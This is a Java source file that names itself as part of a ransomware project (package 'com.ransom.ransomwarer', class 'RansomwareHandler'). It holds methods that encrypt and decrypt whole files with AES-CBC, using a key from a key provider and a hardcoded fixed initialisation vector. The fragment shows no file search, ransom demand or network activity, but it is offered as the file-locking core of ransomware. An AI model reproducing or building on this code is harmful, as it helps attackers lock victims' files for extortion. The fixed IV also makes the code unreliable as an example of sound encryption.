package com.ransom.ransomwarer;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class RansomwareHandler {
	private static void copy(InputStream is, OutputStream os)
			throws IOException {
		int i;
		byte[] b = new byte[10 << 10];
		while ((i = is.read(b)) != -1) {
			os.write(b, 0, i);
		}
	}

	private KeyProvider provider;
	public RansomwareHandler(KeyProvider k) {
		this.provider = k;
	}

	private static IvParameterSpec initVector = new IvParameterSpec(new byte[] {
			127, 0, 127, 15, 0, 14, 101, 0,127, 0, 127, 15, 0, 14, 101, 0 });

	public void encrypt(File in, File out) throws NoSuchAlgorithmException,
			IOException, NoSuchPaddingException, InvalidKeyException,
			InvalidAlgorithmParameterException {

		SecretKey key = this.provider.getKey();

		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.ENCRYPT_MODE, key, initVector);

		FileInputStream fs = new FileInputStream(in);

		CipherInputStream is = new CipherInputStream(fs, cipher);
		FileOutputStream os = new FileOutputStream(out);

		copy(is, os);

		is.close();
		os.close();
	}

	public void decrypt(File in, File out) throws IOException,
			NoSuchAlgorithmException, NoSuchPaddingException,
			InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = this.provider.getKey();

		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, key, initVector);

		InputStream fs = new FileInputStream(in);

		CipherInputStream is = new CipherInputStream(fs, cipher);
		OutputStream os = new FileOutputStream(out);

		copy(is, os);

		is.close();
		os.close();

	}

}
